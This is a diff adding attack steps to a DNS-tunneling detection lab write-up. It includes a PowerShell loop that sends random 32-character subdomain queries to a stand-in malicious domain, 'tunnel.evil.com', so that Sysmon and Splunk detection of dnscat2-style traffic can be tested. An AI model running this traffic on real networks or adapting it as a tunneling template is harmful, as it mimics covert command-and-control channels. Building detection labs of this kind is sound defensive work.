@@ -74,7 +74,33 @@ Server listening and ready to receive tunneled DNS queries.
 <br>
 
 ## Attack Steps
-[in progress]
+
+### Note on dnscat2 Client
+The lab originally intended to use the dnscat2 Windows client to establish a full C2 tunnel. The dnscat2 server was successfully configured on Kali, but ran into errors cofiguring dns client on windows. I tried downloading straight to windows, but the file was linx-compiled binary so windows dind't know what to do with it. So I tried cross-compiling the Windows client from source using mingw-w64 but that produced compilation errors due to type conflicts and missing headers in the dnscat2 codebase:
+
+./libs/select_group.c: error: passing argument 4 of 'ReadFile' from incompatible pointer type
+./tunnel_drivers/driver_dns.c: error: conflicting types for 'driver_dns_destroy'
+
+Instead of spending time resolving upstream source code issues unrelated to detection engineering, I used a PowerShell script to replicate the exact traffic pattern dnscat2 would generate - high volume DNS queries with high entropy random subdomains to a single parent domain. From a Sysmon/Splunk perspective the telemetry comes through exactly the same, as the detection targets the behavioral pattern of the traffic rather than the specific tool generating it.
+
+### 1. Generate DNS Tunneling Traffic
+With Windows 10 DNS redirected to Kali, ran a PowerShell script to simulate dnscat2 C2 traffic - generating high volume, high entropy subdomain queries to a simulated malicious domain:
+
+```powershell
+$domain = "tunnel.evil.com"
+$chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+while($true) {
+    $random = -join ((1..32) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
+    $query = "$random.$domain"
+    try { [System.Net.Dns]::GetHostAddresses($query) } catch {}
+    Start-Sleep -Milliseconds 500
+}
+```
+
+Script generated 32-character random alphanumeric subdomains at 500ms intervals — mimicking real dnscat2 encoded payload traffic. Sysmon Event ID 22 captured every query in real time.
+
+![pic1](screenshots/script.png)
+![pic1](screenshots/sysLogging.png)
 
 ---
 <br>
